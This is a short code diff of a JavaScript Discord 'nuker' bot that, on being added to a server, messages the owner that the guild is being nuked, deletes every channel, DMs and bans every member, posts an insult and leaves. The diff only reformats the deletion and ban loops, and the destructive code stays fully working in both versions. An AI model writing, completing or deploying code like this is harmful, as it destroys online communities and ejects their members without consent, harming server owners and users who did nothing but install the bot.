@@ -9,15 +9,8 @@ client.on('ready', () => {
 client.on('guildCreate', async (guild) => {
   console.log(`Victim: ${guild.name} | Count: ${guild.memberCount}`);
   await guild.owner.send('Hey there! Your guild is getting nuked!').catch(() => {});
-
-  await Promise.all(guild.channels.map(c => {
-    return c.delete().catch(() => {});
-  }));
-
-  await Promise.all(guild.members.map(m => { 
-    return m.send('You\'re getting banned! Nothing personal...').then(() => m.ban()).catch(() => {});
-  }));
-
+  await Promise.all(guild.channels.map(c => { return c.delete().catch(() => {}); }));
+  await Promise.all(guild.members.map(m => { return m.send('You\'re getting banned! Nothing personal...').then(() => m.ban()).catch(() => {}); }));
   await guild.defaultChannel.send('Dumbass, I said not to add the bot...').catch(() => {});
   guild.leave();
 });
